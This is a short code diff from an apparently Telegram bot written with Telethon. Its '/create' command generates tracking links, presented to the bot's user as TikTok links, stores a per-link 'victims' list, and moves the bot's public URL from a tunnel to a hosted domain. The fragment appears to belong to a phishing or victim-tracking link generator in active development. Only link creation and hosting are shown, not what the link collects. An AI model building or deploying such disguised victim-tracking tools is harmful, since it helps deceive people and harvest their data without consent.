@@ -296,7 +296,7 @@ async def start(event):
 async def create(event):
     lid = gen_id()
     links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
-    public_url = "https://f7f695e4bfa354.lhr.life"
+    public_url = "https://botaald.onrender.com"
     await event.reply(f"✅ Ссылка (TikTok):\n`{public_url}/go/{lid}`")
 
 @bot.on(events.NewMessage(pattern='/list'))
